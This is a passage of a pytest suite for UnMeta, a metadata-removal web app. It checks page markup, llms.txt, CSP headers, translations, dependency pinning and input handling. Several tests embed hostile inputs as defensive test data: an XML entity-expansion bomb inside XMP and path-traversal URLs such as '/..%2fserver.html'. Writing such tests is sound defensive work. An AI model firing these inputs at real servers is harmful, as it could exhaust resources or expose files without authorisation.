        for word in ["Photos", "Videos", "Audio", "Documents", "Location", "AI labels", "Never uploaded", 'for="pick"']:
            assert word in hero, (path, word)


def test_guides_are_articles_and_llms_full_has_every_page(monkeypatch):
    import json as _json
    import re as _re
    from metaclean import server
    from metaclean.pages import PAGES
    monkeypatch.setattr(server, "PUBLIC_URL", "https://unmeta.example")
    c = server.create_app().test_client()
    h = {"Host": "unmeta.example"}
    for p in PAGES:
        html = c.get(f"/{p['slug']}/", headers=h).get_data(as_text=True)
        types = {n["@type"] for n in _json.loads(_re.search(r'<script type="application/ld\+json">(.*?)</script>', html, _re.S).group(1))["@graph"]}
        assert ("Article" in types) == (p.get("kind") == "guide"), p["slug"]
        for n in _json.loads(_re.search(r'<script type="application/ld\+json">(.*?)</script>', html, _re.S).group(1))["@graph"]:
            if n["@type"] == "Article":
                assert {"headline", "datePublished", "dateModified", "author", "image"} <= set(n), p["slug"]
    full = c.get("/llms-full.txt", headers=h).get_data(as_text=True)
    assert all(f"https://unmeta.example/{p['slug']}/" in full for p in PAGES)
    assert "<" not in full.replace("<<", "")  # plain text, no markup
    assert "llms" not in c.get("/sitemap.xml", headers=h).get_data(as_text=True)   # sitemap lists HTML pages only
    assert 'rel="alternate" type="text/markdown" href="/llms.txt"' in c.get("/", headers=h).get_data(as_text=True)
    assert "install" not in c.get("/llms.txt", headers=h).get_data(as_text=True).lower()


def test_vercel_config_gives_each_path_exactly_one_policy(tmp_path):
    import json as _json
    import re as _re
    from metaclean.server import export, PAGE_CSP, WORKER_CSP, SW_CSP
    from metaclean.pages import PAGES
    export(tmp_path / "site", "https://unmeta.example")
    rules = _json.loads((tmp_path / "site" / "vercel.json").read_text())["headers"]

    def policies(path):
        return [h["value"] for r in rules if _re.fullmatch(r["source"], path)
                for h in r["headers"] if h["key"] == "Content-Security-Policy"]
    for path in ["/", "/index.html", "/static/app.js", "/llms.txt"] + [f"/{p['slug']}/" for p in PAGES]:
        assert policies(path) == [PAGE_CSP], path
    assert policies("/static/engine.worker.js") == [WORKER_CSP]
    assert policies("/sw.js") == [SW_CSP]
    first = rules[0]["headers"]
    assert any(h["key"] == "Strict-Transport-Security" for h in first)
    assert {"X-Frame-Options", "X-Content-Type-Options", "Permissions-Policy"} <= {h["key"] for h in first}


def test_search_console_verification_file_is_served_byte_for_byte(tmp_path):
    from metaclean.server import create_app, export, ROOT_FILES
    files = sorted(ROOT_FILES.iterdir())
    names = {f.name for f in files}
    assert any(n.startswith("google") for n in names), "Google Search Console verification file missing"
    assert "BingSiteAuth.xml" in names, "Bing verification file missing"
    keys = [f for f in files if f.suffix == ".txt"]
    assert len(keys) == 1 and keys[0].read_text() == keys[0].stem and len(keys[0].stem) == 32, "IndexNow key file"
    c = create_app().test_client()
    for f in files:
        assert c.get(f"/{f.name}").data == f.read_bytes()
    assert c.get("/google-nope.html").status_code == 404
    assert c.get("/..%2fserver.html").status_code == 404
    export(tmp_path / "site", "https://unmeta.example")
    for f in files:
        assert (tmp_path / "site" / f.name).read_bytes() == f.read_bytes()


def test_translated_pages_are_linked_both_ways_and_complete(monkeypatch):
    import re as _re
    from metaclean import server, i18n
    monkeypatch.setattr(server, "PUBLIC_URL", "https://unmeta.example")
    c = server.create_app().test_client()
    h = {"Host": "unmeta.example"}
    assert {"es", "pt-BR", "de", "fr", "hi"} <= set(i18n.LANGS)
    sm = c.get("/sitemap.xml", headers=h).get_data(as_text=True)
    titles = set()
    for slug, (mod, p) in i18n.TRANSLATED.items():
        html = c.get(f"/{slug}/", headers=h).get_data(as_text=True)
        assert f'<html lang="{mod.LANG}"' in html, slug
        assert f'<link rel="canonical" href="https://unmeta.example/{slug}/">' in html, slug
        assert f"https://unmeta.example/{slug}/" in sm, slug
        alts = dict(_re.findall(r'hreflang="([^"]+)" href="https://unmeta\.example([^"]+)"', html))
        assert alts.get(mod.LANG) == f"/{slug}/" and "en" in alts and "x-default" in alts, slug
        # the English page points back
        en = c.get(alts["en"], headers=h).get_data(as_text=True)
        assert f'hreflang="{mod.LANG}" href="https://unmeta.example/{slug}/"' in en, slug
        hero = _re.search(r'<section class="hero".*?</section>', html, _re.S).group(0)
        assert not _re.search(r">\s*(Choose files|Works with|Never uploaded)\s*<", hero), slug
        og = _re.search(r'property="og:image" content="https://unmeta\.example(/static/[^"]+)"', html).group(1)
        assert c.get(og).status_code == 200, (slug, og)
        title = _re.search(r"<title>(.*?)</title>", html).group(1)
        assert title not in titles; titles.add(title)
        foot = _re.search(r'<footer.*?</footer>', html, _re.S).group(0)
        assert "<!--PAGE-LINKS-->" not in foot and f'href="/{slug}/"' in foot, slug   # its own language's pages
        assert ">Remove<" not in foot and ">Guides<" not in foot, slug                 # no English column labels
        assert foot.index('class="foot-langs"') > foot.index('class="foot-brand"'), slug


def test_root_vercel_json_matches_the_server_config():
    import json as _json
    from pathlib import Path
    from metaclean.server import VERCEL_URL, vercel_config
    root = _json.loads((Path(__file__).resolve().parent.parent / "vercel.json").read_text())
    assert root == _json.loads(_json.dumps(vercel_config(VERCEL_URL, build=True))), \
        "vercel.json is stale: run scripts/write_vercel_json.py"
    assert root["outputDirectory"] == "build/unmeta" and "export build/unmeta" in root["buildCommand"]



def test_llms_txt_follows_the_llmstxt_org_format(monkeypatch):
    """H1, a blockquote summary, prose and lists with no headings, then H2 sections that are only link lists."""
    import re as _re
    from metaclean import server
    monkeypatch.setattr(server, "PUBLIC_URL", "https://unmeta.example")
    c = server.create_app().test_client()
    t = c.get("/llms.txt", headers={"Host": "unmeta.example"}).get_data(as_text=True)
    lines = t.splitlines()
    assert lines[0] == "# UnMeta" and lines[2].startswith("> ")
    assert not any(l.startswith("### ") for l in lines) and sum(l.startswith("# ") for l in lines) == 1
    first_h2 = next(i for i, l in enumerate(lines) if l.startswith("## "))
    for l in lines[first_h2:]:
        assert not l or l.startswith("## ") or _re.fullmatch(r"- \[[^\]]+\]\(https://[^)\s]+\)(: .+)?", l), l
    assert "## Optional" in lines


def test_security_txt_and_sitemap_alternates(monkeypatch):
    import re as _re
    import xml.etree.ElementTree as ET
    from datetime import datetime, timezone
    from metaclean import server
    monkeypatch.setattr(server, "PUBLIC_URL", "https://unmeta.example")
    c = server.create_app().test_client()
    h = {"Host": "unmeta.example"}
    sec = c.get("/.well-known/security.txt", headers=h).get_data(as_text=True)
    fields = dict(l.split(": ", 1) for l in sec.strip().splitlines())
    assert fields["Contact"].startswith("https://") and fields["Canonical"] == "https://unmeta.example/.well-known/security.txt"
    expires = datetime.fromisoformat(fields["Expires"].replace("Z", "+00:00"))
    assert 0 < (expires - datetime.now(timezone.utc)).days < 366   # RFC 9116: under a year
    root = ET.fromstring(c.get("/sitemap.xml", headers=h).data)
    ns = {"s": "http://www.sitemaps.org/schemas/sitemap/0.9", "x": "http://www.w3.org/1999/xhtml"}
    urls = root.findall("s:url", ns)
    photos = next(u for u in urls if u.find("s:loc", ns).text == "https://unmeta.example/remove-metadata-from-photos/")
    langs = {l.get("hreflang") for l in photos.findall("x:link", ns)}
    assert {"en", "es", "pt-BR", "de", "fr", "hi", "x-default"} <= langs


def test_supply_chain_is_pinned():
    """The site is built on Vercel from hash-checked, exactly pinned dependencies, and CI actions run at fixed commits."""
    import json as _json
    import re as _re
    from pathlib import Path
    root = Path(__file__).resolve().parent.parent
    cfg = _json.loads((root / "vercel.json").read_text())
    assert "--require-hashes -r requirements.lock" in cfg["installCommand"] and "--no-deps" in cfg["installCommand"]
    lock = (root / "requirements.lock").read_text()
    pins = _re.findall(r"^([a-z0-9_.-]+)==\S+ \\$", lock, _re.M)
    assert {"flask", "werkzeug", "jinja2", "pillow", "setuptools"} <= set(pins)
    for block in _re.split(r"\n(?=[a-z])", lock.split("\n\n", 1)[-1]):
        if _re.match(r"[a-z0-9_.-]+==", block):
            assert "--hash=sha256:" in block, block.splitlines()[0]
    for wf in (root / ".github/workflows").glob("*.yml"):
        for use in _re.findall(r"uses:\s*(\S+)", wf.read_text()):
            assert _re.search(r"@[0-9a-f]{40}$", use), f"{wf.name}: {use} is not pinned to a commit"
        assert "${{" not in "".join(l for l in wf.read_text().splitlines() if l.strip().startswith("run:")), wf.name
    assert any(r["source"] == "/.well-known/(.*)" for r in cfg["headers"])


def test_python_engine_resists_xmp_bombs_and_slow_patterns():
    import time
    from metaclean.inspector import inspect_bytes
    from metaclean.metadata import parse_xmp
    bomb = (b'<x:xmpmeta xmlns:x="adobe:ns:meta/"><!DOCTYPE x [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;">]>'
            b'<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Description a="&b;"/></rdf:RDF></x:xmpmeta>')
    props = parse_xmp(bomb)
    assert props and props[0].qname == "xmp:Unparseable"
    t = time.time()
    inspect_bytes(b"II*\x00" + b"<x:xmpmeta" * 200_000, "x.dng")    # many unmatched starts: must stay linear
    assert time.time() - t < 2


def test_root_files_are_looked_up_not_built_from_the_request():
    from metaclean.server import create_app
    c = create_app().test_client()
    for bad in ["/..%2fserver.html", "/%2e%2e.txt", "/BingSiteAuth..xml", "/nope.txt", "/LICENSE.txt"]:
        assert c.get(bad).status_code == 404, bad



def test_every_page_meets_bing_and_google_snippet_limits():
    """Bing flags titles over ~60 characters, descriptions outside 25-160, and more than one h1."""
    import html as _h
    import re as _re
    from metaclean.server import create_app
    from metaclean.pages import PAGES
    from metaclean.i18n import TRANSLATED
    c = create_app().test_client()
    for path in ["/"] + [f"/{p['slug']}/" for p in PAGES] + [f"/{s}/" for s in TRANSLATED]:
        html = c.get(path).get_data(as_text=True)
        title = _h.unescape(_re.search(r"<title>(.*?)</title>", html).group(1))
        desc = _h.unescape(_re.search(r'<meta name="description" content="([^"]*)">', html).group(1))
        assert len(title) <= 60, (path, len(title), title)
        assert 25 <= len(desc) <= 160, (path, len(desc))
        assert html.count("<h1") == 1, (path, html.count("<h1"))


def test_translated_pages_have_no_english_left():
    """Every bit of interface text on a translated page is in that language (names, formats and demo data excepted)."""
    import html as _h
    import re as _re
    from metaclean.server import create_app
    from metaclean.pages import PAGES
    from metaclean.i18n import TRANSLATED
    c = create_app().test_client()

    def texts(h):
        body = _re.sub(r"<script.*?</script>|<svg.*?</svg>", "", h.split("</head>", 1)[1], flags=_re.S)
        out = {" ".join(t.split()) for t in _re.findall(r">([^<>]+)<", body)}
        out |= set(_re.findall(r'(?:aria-label|data-play|data-pause)="([^"]+)"', body))
        return {_h.unescape(t) for t in out if t.strip()}
    english = set()
    for p in ["/"] + [f"/{x['slug']}/" for x in PAGES]:
        english |= texts(c.get(p).get_data(as_text=True))
    # the same in English and the language, proper names, or made-up demo data
    allowed = {"English", "Deutsch", "Español", "Français", "Português", "Content Credentials", "C2PA Content Credentials",
               "IPTC Digital Source Type", "Jane Doe · 1 Mar 2026", "SAFETY FILM", "UnMeta", "unmeta", "Audio", "Videos",
               "Photos", "Documents", "Menu", "Pause", "Site", "Actions", "Question", "Formats", "Sources", "Limites"}
    for slug in TRANSLATED:
        left = [t for t in texts(c.get(f"/{slug}/").get_data(as_text=True)) & english
                if t not in allowed and (_re.search(r"[A-Za-z]{3,} [a-z]{2,}", t) or _re.fullmatch(r"[A-Z][a-z]{3,}", t))]
        assert not left, (slug, left)


def test_app_screens_are_translated_on_every_translated_page():
    """The review and results screens get their wording from a JSON data block in the page's language."""
    import json as _json
    import re as _re
    from pathlib import Path
    from metaclean.server import create_app
    from metaclean.i18n import TRANSLATED
    here = Path(__file__).resolve().parent.parent / "metaclean/i18n"
    app_en = _json.loads((here / "app_en.json").read_text())
    text_en = _json.loads((here / "text_en.json").read_text())
    c = create_app().test_client()
    assert 'id="l10n"' not in c.get("/").get_data(as_text=True)          # English uses the built-in table
    # the table in app.js and app_en.json must not drift apart
    js = (Path(__file__).resolve().parent.parent / "metaclean/static/app.js").read_text()
    assert _json.loads(js.split("/*EN-START*/", 1)[1].split("/*EN-END*/", 1)[0]) == app_en
    for slug in TRANSLATED:
        html = c.get(f"/{slug}/").get_data(as_text=True)
        block = _re.search(r'<script type="application/json" id="l10n">(.*?)</script>', html, _re.S).group(1)
        data = _json.loads(block)
        assert set(app_en) <= set(data["app"]), slug
        assert set(text_en) <= set(data["text"]), slug
        assert all(data["app"][k] != v for k, v in app_en.items() if len(v) > 20), slug   # sentences really translated
